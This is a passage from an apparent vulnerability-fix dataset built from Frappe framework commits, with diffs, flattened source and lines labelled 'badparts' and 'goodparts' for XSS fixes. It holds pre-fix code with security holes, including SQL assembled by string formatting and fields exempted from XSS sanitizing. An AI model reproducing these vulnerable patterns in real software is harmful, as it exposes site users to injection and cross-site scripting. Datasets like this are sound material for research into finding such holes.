\t\tif not post.comments: \t\t\tpost.comment_text=_('No comments yet') \t\telif post.comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"): \t\t\tpost.avatar=\"/\" +post.avatar \treturn posts ",
                    "sourceWithComments": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport frappe\nfrom frappe import _\nfrom frappe.website.website_generator import WebsiteGenerator\nfrom frappe.website.render import clear_cache\nfrom frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\nfrom frappe.website.utils import find_first_image, get_comment_list\n\nclass BlogPost(WebsiteGenerator):\n\twebsite = frappe._dict(\n\t\torder_by = \"published_on desc\"\n\t)\n\n\tdef make_route(self):\n\t\tif not self.route:\n\t\t\treturn frappe.db.get_value('Blog Category', self.blog_category,\n\t\t\t\t'route') + '/' + self.scrub(self.title)\n\n\tdef get_feed(self):\n\t\treturn self.title\n\n\tdef validate(self):\n\t\tsuper(BlogPost, self).validate()\n\n\t\tif not self.blog_intro:\n\t\t\tself.blog_intro = self.content[:140]\n\t\t\tself.blog_intro = strip_html_tags(self.blog_intro)\n\n\t\tif self.blog_intro:\n\t\t\tself.blog_intro = self.blog_intro[:140]\n\n\t\tif self.published and not self.published_on:\n\t\t\tself.published_on = today()\n\n\t\t# update posts\n\t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post`\n\t\t\twhere ifnull(blogger,'')=tabBlogger.name)\n\t\t\twhere name=%s\"\"\", (self.blogger,))\n\n\tdef on_update(self):\n\t\tclear_cache(\"writers\")\n\n\tdef get_context(self, context):\n\t\t# this is for double precaution. usually it wont reach this code if not published\n\t\tif not cint(self.published):\n\t\t\traise Exception(\"This blog has not been published yet!\")\n\n\t\t# temp fields\n\t\tcontext.full_name = get_fullname(self.owner)\n\t\tcontext.updated = global_date_format(self.published_on)\n\n\t\tif self.blogger:\n\t\t\tcontext.blogger_info = frappe.get_doc(\"Blogger\", self.blogger).as_dict()\n\n\t\tcontext.description = self.blog_intro or self.content[:140]\n\n\t\tcontext.metatags = {\n\t\t\t\"name\": self.title,\n\t\t\t\"description\": context.description,\n\t\t}\n\n\t\tif \"<!-- markdown -->\" in context.content:\n\t\t\tcontext.content = markdown(context.content)\n\n\t\timage = find_first_image(self.content)\n\t\tif image:\n\t\t\tcontext.metatags[\"image\"] = image\n\n\t\tcontext.comment_list = get_comment_list(self.doctype, self.name)\n\t\tif not context.comment_list:\n\t\t\tcontext.comment_text = _('No comments yet')\n\t\telse:\n\t\t\tif(len(context.comment_list)) == 1:\n\t\t\t\tcontext.comment_text = _('1 comment')\n\t\t\telse:\n\t\t\t\tcontext.comment_text = _('{0} comments').format(len(context.comment_list))\n\n\t\tcontext.category = frappe.db.get_value(\"Blog Category\",\n\t\t\tcontext.doc.blog_category, [\"title\", \"route\"], as_dict=1)\n\t\tcontext.parents = [{\"name\": _(\"Home\"), \"route\":\"/\"},\n\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"},\n\t\t\t{\"label\": context.category.title, \"route\":context.category.route}]\n\ndef get_list_context(context=None):\n\tlist_context = frappe._dict(\n\t\ttemplate = \"templates/includes/blog/blog.html\",\n\t\tget_list = get_blog_list,\n\t\thide_filters = True,\n\t\tchildren = get_children(),\n\t\t# show_search = True,\n\t\ttitle = _('Blog')\n\t)\n\n\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n\tif category:\n\t\tcategory_title = get_blog_category(category)\n\t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n\t\tlist_context.title = category_title\n\n\telif frappe.local.form_dict.blogger:\n\t\tblogger = frappe.db.get_value(\"Blogger\", {\"name\": frappe.local.form_dict.blogger}, \"full_name\")\n\t\tlist_context.sub_title = _(\"Posts by {0}\").format(blogger)\n\t\tlist_context.title = blogger\n\n\telif frappe.local.form_dict.txt:\n\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n\n\tif list_context.sub_title:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n\t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}]\n\telse:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"}]\n\n\tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True))\n\treturn list_context\n\ndef get_children():\n\treturn frappe.db.sql(\"\"\"select route as name,\n\t\ttitle from `tabBlog Category`\n\t\twhere published = 1\n\t\tand exists (select name from `tabBlog Post`\n\t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)\n\t\torder by title asc\"\"\", as_dict=1)\n\ndef clear_blog_cache():\n\tfor blog in frappe.db.sql_list(\"\"\"select route from\n\t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"):\n\t\tclear_cache(blog)\n\n\tclear_cache(\"writers\")\n\ndef get_blog_category(route):\n\treturn frappe.db.get_value(\"Blog Category\", {\"name\": route}, \"title\") or route\n\ndef get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):\n\tconditions = []\n\tif filters:\n\t\tif filters.blogger:\n\t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger))\n\t\tif filters.blog_category:\n\t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category))\n\n\tif txt:\n\t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt)))\n\n\tif conditions:\n\t\tfrappe.local.no_cache = 1\n\n\tquery = \"\"\"\\\n\t\tselect\n\t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on,\n\t\t\t\tt1.published_on as creation,\n\t\t\t\tt1.content as content,\n\t\t\t\tifnull(t1.blog_intro, t1.content) as intro,\n\t\t\t\tt2.full_name, t2.avatar, t1.blogger,\n\t\t\t\t(select count(name) from `tabCommunication`\n\t\t\t\t\twhere\n\t\t\t\t\t\tcommunication_type='Comment'\n\t\t\t\t\t\tand comment_type='Comment'\n\t\t\t\t\t\tand reference_doctype='Blog Post'\n\t\t\t\t\t\tand reference_name=t1.name) as comments\n\t\tfrom `tabBlog Post` t1, `tabBlogger` t2\n\t\twhere ifnull(t1.published,0)=1\n\t\tand t1.blogger = t2.name\n\t\t%(condition)s\n\t\torder by published_on desc, name asc\n\t\tlimit %(start)s, %(page_len)s\"\"\" % {\n\t\t\t\"start\": limit_start, \"page_len\": limit_page_length,\n\t\t\t\t\"condition\": (\" and \" + \" and \".join(conditions)) if conditions else \"\"\n\t\t}\n\n\tposts = frappe.db.sql(query, as_dict=1)\n\n\tfor post in posts:\n\t\tpost.cover_image = find_first_image(post.content)\n\t\tpost.published = global_date_format(post.creation)\n\t\tpost.content = strip_html_tags(post.content[:340])\n\t\tif not post.comments:\n\t\t\tpost.comment_text = _('No comments yet')\n\t\telif post.comments==1:\n\t\t\tpost.comment_text = _('1 comment')\n\t\telse:\n\t\t\tpost.comment_text = _('{0} comments').format(str(post.comments))\n\n\t\tpost.avatar = post.avatar or \"\"\n\t\tpost.category = frappe.db.get_value('Blog Category', post.blog_category,\n\t\t\t['route', 'title'], as_dict=True)\n\n\t\tif post.avatar and (not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"):\n\t\t\tpost.avatar = \"/\" + post.avatar\n\n\treturn posts\n"
                }
            },
            "msg": "fix(blog): Fix possible reflected XSS attack vector"
        },
        "acd2f589b6cd2d1011be4a4e4965a1b3ed489c37": {
            "url": "https://api.github.com/repos/Benefactors/rosling/commits/acd2f589b6cd2d1011be4a4e4965a1b3ed489c37",
            "html_url": "https://github.com/Benefactors/rosling/commit/acd2f589b6cd2d1011be4a4e4965a1b3ed489c37",
            "sha": "acd2f589b6cd2d1011be4a4e4965a1b3ed489c37",
            "keyword": "XSS fix",
            "diff": "diff --git a/frappe/core/doctype/doctype/doctype.py b/frappe/core/doctype/doctype/doctype.py\nindex a06a33df1..fedb605ad 100644\n--- a/frappe/core/doctype/doctype/doctype.py\n+++ b/frappe/core/doctype/doctype/doctype.py\n@@ -715,7 +715,6 @@ def scrub_fetch_from(field):\n \tfor d in fields:\n \t\tif not d.permlevel: d.permlevel = 0\n \t\tif d.fieldtype != \"Table\": d.allow_bulk_edit = 0\n-\t\tif d.fieldtype == \"Barcode\": d.ignore_xss_filter = 1\n \t\tif not d.fieldname:\n \t\t\td.fieldname = d.fieldname.lower()\n \ndiff --git a/frappe/model/base_document.py b/frappe/model/base_document.py\nindex 922557fee..982c54c3a 100644\n--- a/frappe/model/base_document.py\n+++ b/frappe/model/base_document.py\n@@ -627,7 +627,7 @@ def _sanitize_content(self):\n \n \t\t\telif df and (df.get(\"ignore_xss_filter\")\n \t\t\t\t\t\tor (df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\")\n-\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\")\n+\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\", \"Barcode\")\n \n \t\t\t\t\t\t# cancelled and submit but not update after submit should be ignored\n \t\t\t\t\t\tor self.docstatus==2\n",
            "message": "",
            "files": {
                "/frappe/core/doctype/doctype/doctype.py": {
                    "changes": [
                        {
                            "diff": "\n \tfor d in fields:\n \t\tif not d.permlevel: d.permlevel = 0\n \t\tif d.fieldtype != \"Table\": d.allow_bulk_edit = 0\n-\t\tif d.fieldtype == \"Barcode\": d.ignore_xss_filter = 1\n \t\tif not d.fieldname:\n \t\t\td.fieldname = d.fieldname.lower()\n ",
                            "add": 0,
                            "remove": 1,
                            "filename": "/frappe/core/doctype/doctype/doctype.py",
                            "badparts": [
                                "\t\tif d.fieldtype == \"Barcode\": d.ignore_xss_filter = 1"
                            ],
                            "goodparts": []
                        }
                    ]
                },
                "/frappe/model/base_document.py": {
                    "changes": [
                        {
                            "diff": "\n \n \t\t\telif df and (df.get(\"ignore_xss_filter\")\n \t\t\t\t\t\tor (df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\")\n-\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\")\n+\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\", \"Barcode\")\n \n \t\t\t\t\t\t# cancelled and submit but not update after submit should be ignored\n \t\t\t\t\t\tor self.docstatus==2\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/frappe/model/base_document.py",
                            "badparts": [
                                "\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\")"
                            ],
                            "goodparts": [
                                "\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\", \"Barcode\")"
                            ]
                        }
                    ],
                    "source": "\n from __future__ import unicode_literals from six import iteritems, string_types import datetime import frappe, sys from frappe import _ from frappe.utils import(cint, flt, now, cstr, strip_html, \tsanitize_html, sanitize_email, cast_fieldtype) from frappe.model import default_fields from frappe.model.naming import set_new_name from frappe.model.utils.link_count import notify_link_count from frappe.modules import load_doctype_module from frappe.model import display_fieldtypes from frappe.model.db_schema import type_map, varchar_len from frappe.utils.password import get_decrypted_password, set_encrypted_password _classes={} def get_controller(doctype): \t\"\"\"Returns the **class** object of the given DocType. \tFor `custom` type, returns `frappe.model.document.Document`. \t:param doctype: DocType name as string.\"\"\" \tfrom frappe.model.document import Document \tglobal _classes \tif not doctype in _classes: \t\tmodule_name, custom=frappe.db.get_value(\"DocType\", doctype,(\"module\", \"custom\"), cache=True) \\ \t\t\tor[\"Core\", False] \t\tif custom: \t\t\t_class=Document \t\telse: \t\t\tmodule=load_doctype_module(doctype, module_name) \t\t\tclassname=doctype.replace(\" \", \"\").replace(\"-\", \"\") \t\t\tif hasattr(module, classname): \t\t\t\t_class=getattr(module, classname) \t\t\t\tif issubclass(_class, BaseDocument): \t\t\t\t\t_class=getattr(module, classname) \t\t\t\telse: \t\t\t\t\traise ImportError(doctype) \t\t\telse: \t\t\t\traise ImportError(doctype) \t\t_classes[doctype]=_class \treturn _classes[doctype] class BaseDocument(object): \tignore_in_getter=(\"doctype\", \"_meta\", \"meta\", \"_table_fields\", \"_valid_columns\") \tdef __init__(self, d): \t\tself.update(d) \t\tself.dont_update_if_missing=[] \t\tif hasattr(self, \"__setup__\"): \t\t\tself.__setup__() \t@property \tdef meta(self): \t\tif not hasattr(self, \"_meta\"): \t\t\tself._meta=frappe.get_meta(self.doctype) \t\treturn self._meta \tdef update(self, d): \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif key in d: \t\t\t\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d): \t\tif isinstance(d, BaseDocument): \t\t\td=d.get_valid_dict() \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\tfor key, value in iteritems(d): \t\t\t \t\t\tif(self.get(key) is None) and(value is not None) and(key not in self.dont_update_if_missing): \t\t\t\tself.set(key, value) \tdef get_db_value(self, key): \t\treturn frappe.db.get_value(self.doctype, self.name, key) \tdef get(self, key=None, filters=None, limit=None, default=None): \t\tif key: \t\t\tif isinstance(key, dict): \t\t\t\treturn _filter(self.get_all_children(), key, limit=limit) \t\t\tif filters: \t\t\t\tif isinstance(filters, dict): \t\t\t\t\tvalue=_filter(self.__dict__.get(key,[]), filters, limit=limit) \t\t\t\telse: \t\t\t\t\tdefault=filters \t\t\t\t\tfilters=None \t\t\t\t\tvalue=self.__dict__.get(key, default) \t\t\telse: \t\t\t\tvalue=self.__dict__.get(key, default) \t\t\tif value is None and key not in self.ignore_in_getter \\ \t\t\t\tand key in(d.fieldname for d in self.meta.get_table_fields()): \t\t\t\tself.set(key,[]) \t\t\t\tvalue=self.__dict__.get(key) \t\t\treturn value \t\telse: \t\t\treturn self.__dict__ \tdef getone(self, key, filters=None): \t\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend(key, value) \t\telse: \t\t\tself.__dict__[key]=value \tdef delete_key(self, key): \t\tif key in self.__dict__: \t\t\tdel self.__dict__[key] \tdef append(self, key, value=None): \t\tif value==None: \t\t\tvalue={} \t\tif isinstance(value,(dict, BaseDocument)): \t\t\tif not self.__dict__.get(key): \t\t\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key].append(value) \t\t\t \t\t\tvalue.parent_doc=self \t\t\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif(getattr(self, '_metaclass', None) \t\t\t\tor self.__class__.__name__ in('Meta', 'FormMeta', 'DocField')): \t\t\t\treturn value \t\t\traise ValueError( \t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not{2}({3})'.format(key, \t\t\t\t\tself.name, str(type(value))[1:-1], value) \t\t\t) \tdef extend(self, key, value): \t\tif isinstance(value, list): \t\t\tfor v in value: \t\t\t\tself.append(key, v) \t\telse: \t\t\traise ValueError \tdef remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn value \t\tif not isinstance(value, BaseDocument): \t\t\tif \"doctype\" not in value: \t\t\t\tvalue[\"doctype\"]=self.get_table_field_doctype(key) \t\t\t\tif not value[\"doctype\"]: \t\t\t\t\traise AttributeError(key) \t\t\tvalue=get_controller(value[\"doctype\"])(value) \t\t\tvalue.init_valid_columns() \t\tvalue.parent=self.name \t\tvalue.parenttype=self.doctype \t\tvalue.parentfield=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus=0 \t\tif not getattr(value, \"idx\", None): \t\t\tvalue.idx=len(self.get(key) or[]) +1 \t\tif not getattr(value, \"name\", None): \t\t\tvalue.__dict__['__islocal']=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif not sanitize and d[fieldname] is None: \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif df: \t\t\t\tif df.fieldtype==\"Check\": \t\t\t\t\tif d[fieldname]==None: \t\t\t\t\t\td[fieldname]=0 \t\t\t\t\telif(not isinstance(d[fieldname], int) or d[fieldname] > 1): \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname]) else 0 \t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float): \t\t\t\t\td[fieldname]=flt(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\": \t\t\t\t\td[fieldname]=None \t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\": \t\t\t\t\t \t\t\t\t\td[fieldname]=None \t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d[fieldname],(datetime.datetime, datetime.time, datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname]) \t\treturn d \tdef init_valid_columns(self): \t\tfor key in default_fields: \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \t\t\tif key in(\"idx\", \"docstatus\") and self.__dict__[key] is None: \t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns(): \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \tdef get_valid_columns(self): \t\tif self.doctype not in frappe.local.valid_columns: \t\t\tif self.doctype in(\"DocField\", \"DocPerm\") and self.parent in(\"DocType\", \"DocField\", \"DocPerm\"): \t\t\t\tfrom frappe.model.meta import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns() \t\t\tfrappe.local.valid_columns[self.doctype]=valid \t\treturn frappe.local.valid_columns[self.doctype] \tdef is_new(self): \t\treturn self.get(\"__islocal\") \tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False): \t\tdoc=self.get_valid_dict(convert_dates_to_str=convert_dates_to_str) \t\tdoc[\"doctype\"]=self.doctype \t\tfor df in self.meta.get_table_fields(): \t\t\tchildren=self.get(df.fieldname) or[] \t\t\tdoc[df.fieldname]=[d.as_dict(no_nulls=no_nulls) for d in children] \t\tif no_nulls: \t\t\tfor k in list(doc): \t\t\t\tif doc[k] is None: \t\t\t\t\tdel doc[k] \t\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"): \t\t\tif self.get(key): \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json(self): \t\treturn frappe.as_json(self.as_dict()) \tdef get_table_field_doctype(self, fieldname): \t\treturn self.meta.get_field(fieldname).options \tdef get_parentfield_of_doctype(self, doctype): \t\tfieldname=[df.fieldname for df in self.meta.get_table_fields() if df.options==doctype] \t\treturn fieldname[0] if fieldname else None \tdef db_insert(self): \t\t\"\"\"INSERT the document(with valid columns) in the database.\"\"\" \t\tif not self.name: \t\t\t \t\t\tset_new_name(self) \t\tif not self.creation: \t\t\tself.creation=self.modified=now() \t\t\tself.created_by=self.modifield_by=frappe.session.user \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}` \t\t\t\t({columns}) values({values})\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tcolumns=\", \".join([\"`\"+c+\"`\" for c in columns]), \t\t\t\t\tvalues=\", \".join([\"%s\"] * len(columns)) \t\t\t\t), list(d.values())) \t\texcept Exception as e: \t\t\tif e.args[0]==1062: \t\t\t\tif \"PRIMARY\" in cstr(e.args[1]): \t\t\t\t\tif self.meta.autoname==\"hash\": \t\t\t\t\t\t \t\t\t\t\t\tself.name=None \t\t\t\t\t\tself.db_insert() \t\t\t\t\t\treturn \t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e) \t\t\t\telif \"Duplicate\" in cstr(e.args[1]): \t\t\t\t\t \t\t\t\t\tself.show_unique_validation_message(e) \t\t\t\telse: \t\t\t\t\traise \t\t\telse: \t\t\t\traise \t\tself.set(\"__islocal\", False) \tdef db_update(self): \t\tif self.get(\"__islocal\") or not self.name: \t\t\tself.db_insert() \t\t\treturn \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\t \t\tname=d['name'] \t\tdel d['name'] \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}` \t\t\t\tset{values} where name=%s\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tvalues=\", \".join([\"`\"+c+\"`=%s\" for c in columns]) \t\t\t\t), list(d.values()) +[name]) \t\texcept Exception as e: \t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]): \t\t\t\tself.show_unique_validation_message(e) \t\t\telse: \t\t\t\traise \tdef show_unique_validation_message(self, e): \t\ttype, value, traceback=sys.exc_info() \t\tfieldname, label=str(e).split(\"'\")[-2], None \t\t \t\t \t\tif \"unique_\" in fieldname: \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname))) \t\t \t\traise frappe.UniqueValidationError(self.doctype, self.name, e) \tdef update_modified(self): \t\t'''Update modified timestamp''' \t\tself.set(\"modified\", now()) \t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False) \tdef _fix_numeric_types(self): \t\tfor df in self.meta.get(\"fields\"): \t\t\tif df.fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\telif self.get(df.fieldname) is not None: \t\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\t\telif df.fieldtype in(\"Float\", \"Currency\", \"Percent\"): \t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname))) \t\tif self.docstatus is not None: \t\t\tself.docstatus=cint(self.docstatus) \tdef _get_missing_mandatory_fields(self): \t\t\"\"\"Get mandatory fields that do not have any values\"\"\" \t\tdef get_msg(df): \t\t\tif df.fieldtype==\"Table\": \t\t\t\treturn \"{}:{}:{}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label)) \t\t\telif self.parentfield: \t\t\t\treturn \"{}:{}{} \t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label)) \t\t\telse: \t\t\t\treturn _(\"Error: Value missing for{0}:{1}\").format(_(df.parent), _(df.label)) \t\tmissing=[] \t\tfor df in self.meta.get(\"fields\",{\"reqd\":('=', 1)}): \t\t\tif self.get(df.fieldname) in(None,[]) or not strip_html(cstr(self.get(df.fieldname))).strip(): \t\t\t\tmissing.append((df.fieldname, get_msg(df))) \t\t \t\tif self.meta.istable: \t\t\tfor fieldname in(\"parent\", \"parenttype\"): \t\t\t\tif not self.get(fieldname): \t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname)))) \t\treturn missing \tdef get_invalid_links(self, is_submittable=False): \t\t'''Returns list of invalid links and also updates fetch values if not set''' \t\tdef get_msg(df, docname): \t\t\tif self.parentfield: \t\t\t\treturn \"{} \t\t\telse: \t\t\t\treturn \"{}:{}\".format(_(df.label), docname) \t\tinvalid_links=[] \t\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields() \t\t\t\t+self.meta.get(\"fields\",{\"fieldtype\":('=', \"Dynamic Link\")})): \t\t\tdocname=self.get(df.fieldname) \t\t\tif docname: \t\t\t\tif df.fieldtype==\"Link\": \t\t\t\t\tdoctype=df.options \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field{0}\").format(df.fieldname)) \t\t\t\telse: \t\t\t\t\tdoctype=self.get(df.options) \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[ \t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname) \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and not self.get(_df.fieldname)) \t\t\t\t] \t\t\t\tif not fields_to_fetch: \t\t\t\t\t \t\t\t\t\tvalues=frappe._dict(name=frappe.db.get_value(doctype, docname, \t\t\t\t\t\t'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df.fetch_from.split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype \t\t\t\tif values: \t\t\t\t\tsetattr(self, df.fieldname, values.name) \t\t\t\t\tfor _df in fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname) \t\t\t\t\tif not values.name: \t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname))) \t\t\t\t\telif(df.fieldname !=\"amended_from\" \t\t\t\t\t\tand(is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable \t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\"))==2): \t\t\t\t\t\tcancelled_links.append((df.fieldname, docname, get_msg(df, docname))) \t\treturn invalid_links, cancelled_links \tdef _validate_selects(self): \t\tif frappe.flags.in_import: \t\t\treturn \t\tfor df in self.meta.get_select_fields(): \t\t\tif df.fieldname==\"naming_series\" or not(self.get(df.fieldname) and df.options): \t\t\t\tcontinue \t\t\toptions=(df.options or \"\").split(\"\\n\") \t\t\t \t\t\tif not filter(None, options): \t\t\t\tcontinue \t\t\t \t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags.in_test and value.startswith(\"_T-\")): \t\t\t\t \t\t\t\tprefix=_(\"Row \t\t\t\tlabel=_(self.meta.get_label(df.fieldname)) \t\t\t\tcomma_options='\", \"'.join(_(each) for each in options) \t\t\t\tfrappe.throw(_('{0}{1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants: \t\t\treturn \t\tconstants=[d.fieldname for d in self.meta.get(\"fields\",{\"set_only_once\":('=',1)})] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t\t\tdf=self.meta.get_field(fieldname) \t\t\t \t\t\tif df.fieldtype=='Date' or df.fieldtype=='Datetime': \t\t\t\tvalue=str(values.get(fieldname)) \t\t\telse: \t\t\t\tvalue =values.get(fieldname) \t\t\tif self.get(fieldname) !=value: \t\t\t\tfrappe.throw(_(\"Value cannot be changed for{0}\").format(self.meta.get_label(fieldname)), \t\t\t\t\tfrappe.CannotChangeConstantError) \tdef _validate_length(self): \t\tif frappe.flags.in_install: \t\t\treturn \t\tif self.meta.issingle: \t\t\t \t\t\treturn \t\tcolumn_types_to_check_length=('varchar', 'int', 'bigint') \t\tfor fieldname, value in iteritems(self.get_valid_dict()): \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif not df or df.fieldtype=='Check': \t\t\t\t \t\t\t\tcontinue \t\t\tcolumn_type=type_map[df.fieldtype][0] or None \t\t\tdefault_column_max_length=type_map[df.fieldtype][1] or None \t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length: \t\t\t\tmax_length=cint(df.get(\"length\")) or cint(default_column_max_length) \t\t\t\tif len(cstr(value)) > max_length: \t\t\t\t\tif self.parentfield and self.idx: \t\t\t\t\t\treference=_(\"{0}, Row{1}\").format(_(self.doctype), self.idx) \t\t\t\t\telse: \t\t\t\t\t\treference=\"{0}{1}\".format(_(self.doctype), self.name) \t\t\t\t\tfrappe.throw(_(\"{0}: '{1}'({3}) will get truncated, as max characters allowed is{2}\")\\ \t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big')) \tdef _validate_update_after_submit(self): \t\t \t\tdb_values=frappe.get_doc(self.doctype, self.name).as_dict() \t\tfor key in 